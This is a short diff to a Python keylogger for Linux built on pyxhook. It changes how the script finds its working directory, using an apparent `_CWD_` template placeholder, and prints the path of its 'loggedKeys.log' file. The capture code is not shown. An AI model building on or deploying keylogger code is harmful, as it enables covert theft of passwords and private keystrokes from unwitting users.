@@ -9,10 +9,10 @@ import os
 import sys
 from argparse import ArgumentParser
 
-
 import pyxhook
 
-
+cwd = _CWD_
+    
 def main():
     parser = ArgumentParser(description='A simple keylogger for Linux.')
     parser.add_argument(
@@ -32,8 +32,9 @@ def main():
             )
 
     args = parser.parse_args()
-    cwd = os.path.dirname(os.path.realpath(sys.argv[0])) # current working directory for work after daemonizing
+    # current working directory for work after daemonizing
     logged = cwd +'/loggedKeys.log'
+    print(logged)
     log_file = logged
 
     if args.clean_file:
